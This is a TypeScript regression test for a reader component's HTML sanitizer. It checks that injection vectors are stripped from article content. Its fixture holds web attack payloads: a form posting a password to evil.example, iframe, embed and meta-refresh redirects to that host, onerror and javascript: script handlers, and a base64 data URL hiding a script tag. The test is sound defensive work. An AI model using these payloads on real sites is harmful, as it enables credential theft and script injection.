import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { JSDOM } from "jsdom";
import { createServer } from "vite";

const { window } = new JSDOM("");
globalThis.window = window as unknown as Window & typeof globalThis;

const testDir = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(testDir, "..");
const vite = await createServer({ root, appType: "custom", server: { middlewareMode: true } });
const readerModule = await vite.ssrLoadModule("/src/components/ReaderModal.tsx") as Record<string, unknown>;
const sanitizeArticleHtml = readerModule.sanitizeArticleHtml;

assert.equal(typeof sanitizeArticleHtml, "function", "ReaderModal must export its article HTML sanitizer for regression coverage");
if (typeof sanitizeArticleHtml !== "function") {
  throw new TypeError("sanitizeArticleHtml is not available");
}

const maliciousArticle = `
  <style>.reader-takeover { position: fixed; inset: 0; z-index: 999999; }</style>
  <form action="https://evil.example/collect">
    <input name="password" value="stolen">
    <button type="submit">Send</button>
  </form>
  <div class="reader-takeover" style="position:fixed;inset:0" onclick="alert(1)">Overlay copy</div>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="https://evil.example/object"></object>
  <embed src="https://evil.example/embed">
  <meta http-equiv="refresh" content="0;url=https://evil.example">
  <p>Useful <strong>article</strong> copy.</p>
  <img src="https://cdn.example.com/photo.jpg" alt="Article photo" onerror="alert(1)">
  <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="Dangerous data image">
  <a href="https://example.com/source" target="_blank">Safe source</a>
  <a href="javascript:alert(1)">Dangerous link</a>
`;

const sanitized = sanitizeArticleHtml(maliciousArticle) as string;
const document = new JSDOM(`<body>${sanitized}</body>`).window.document;

assert.equal(document.querySelector("style, form, input, button, iframe, object, embed, meta"), null);
assert.equal(document.querySelector("[style], [onclick], [onerror]"), null);
assert.doesNotMatch(sanitized, /position\s*:\s*fixed|reader-takeover|javascript:|data:text\/html/i);
assert.doesNotMatch(sanitized, /Send|stolen/, "Forbidden form contents must be discarded with their controls");
assert.match(sanitized, /<p>Useful <strong>article<\/strong> copy\.<\/p>/);
assert.equal(document.querySelector('img[alt="Article photo"]')?.getAttribute("src"), "https://cdn.example.com/photo.jpg");
assert.equal(document.querySelector('img[alt="Dangerous data image"]')?.hasAttribute("src"), false);
assert.equal(document.querySelector("a")?.getAttribute("href"), "https://example.com/source");
assert.equal(document.querySelectorAll("a")[1]?.hasAttribute("href"), false);

const readerSource = readFileSync(path.join(testDir, "../src/components/ReaderModal.tsx"), "utf8");
assert.doesNotMatch(readerSource, /rehypeRaw/, "ReactMarkdown must not parse untrusted raw HTML");
assert.equal((readerSource.match(/dangerouslySetInnerHTML/g) || []).length, 1);
assert.match(
  readerSource,
  /dangerouslySetInnerHTML=\{\{\s*__html:\s*sanitizedArticleContent\s*\}\}/,
  "The article HTML insertion path must use the DOMPurify result",
);

await vite.close();
console.log("PASS: reader strips persistent article HTML and CSS injection vectors");
